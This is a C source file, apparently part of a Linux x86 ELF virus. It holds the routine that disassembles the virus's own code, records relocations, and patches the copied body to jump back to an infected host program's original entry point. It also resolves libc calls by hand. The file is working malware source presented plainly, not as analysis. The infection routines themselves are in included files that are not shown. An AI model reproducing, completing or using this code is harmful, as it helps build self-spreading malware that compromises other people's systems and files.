#include <asm/unistd.h>
#include <elf.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define	YAD_ASM
#include "../yad/yad.h"
#include "../yad/yad.c"

extern void _recovery();
extern uint8_t __text_start, __text_end, __data_start, __data_end, virus_start;

uint32_t text_size, data_size, orig_esp;
#include "../common_libc.c"
#include "libc.h"
libc_t libc;
uint32_t *rel;

uint32_t libc_call (int num)
{
	if (libc.nsyms == 0)
		find_libc(&libc);
	if (v_got_plt[num] == 0)
		v_got_plt[num] = resolve(&libc, v_dyn_str + v_dyn_off[num]);
	return v_got_plt[num];
}

/* the key feature */
void relocate(uint8_t *text, uint8_t *data, uint32_t new_text, uint32_t new_data, uint32_t old_entry)
{
	int i;
	uint32_t type, offset;
	for (i = 0; rel[i] != 0; i++) {
		offset = rel[i] & 0x3fffffff;
		if ((type = rel[i] >> 30) == 3)
			*(uint32_t*)(text + offset) = old_entry - (new_text + offset + 4);
		else
			*(uint32_t*)(text + offset) += (type == 0) ?
				new_text - (uint32_t)&__text_start :
				new_data - (uint32_t)&__data_start;
	}
}

int init(void)
{
	yad_t y;
	uint8_t *p;
	uint32_t r, offset, count;

	bzero(&libc, sizeof(libc));
	bzero(v_got_plt, sizeof(v_got_plt));

	/* disassemble our own code */
	for (rel = NULL, count = 0, offset = 0; offset < text_size; offset += y.len) {
		r = 0;
		p = (uint8_t*)&__text_start + offset;
		if (yad(p, &y) == 0 || (y.flags & C_BAD))
			return 0;
		/* pattern for ret-to-host insns (popa / jmp near) */
		if(*(p - 1) == 0x61 && *p == 0xe9)
			r = (3 << 30) | (offset + 1);
		else
#define	CHECK_FOR_REL(a,b,c, d)	\
		if (y.a >= (uint32_t)&__ ## b ## _start && y.a <= (uint32_t)&__ ## b ## _end)	\
			r = (offset + y.len - 4 + c) | (d << 30);	\
		else
		CHECK_FOR_REL(data4, text, 0, 0)
		CHECK_FOR_REL(data4, data, 0, 1)
		CHECK_FOR_REL(addr4, text, -y.datasize, 0)
		CHECK_FOR_REL(addr4, data, -y.datasize, 1)
		;
		/* add reloc to the table */
		if (r != 0) {
			rel = (uint32_t*)realloc(rel, (count + 2) * 4);
			if (rel == NULL)
				return 0;
			/* it's just a 0-terminated array of dwords, where */
			/* bits 31,30 indicate type (0 - text, 1 - data, 3 - EP) */
			/* the rest is offset */
			rel[count++] = r;
		}
	}
	/* terminate the list */
	if (rel)
		rel[count++] = 0;
	return 1;
}

#define	NEW_ENTRY	(uint32_t)&virus_start - (uint32_t)&__text_start + new_text
#include "../common_main.c"
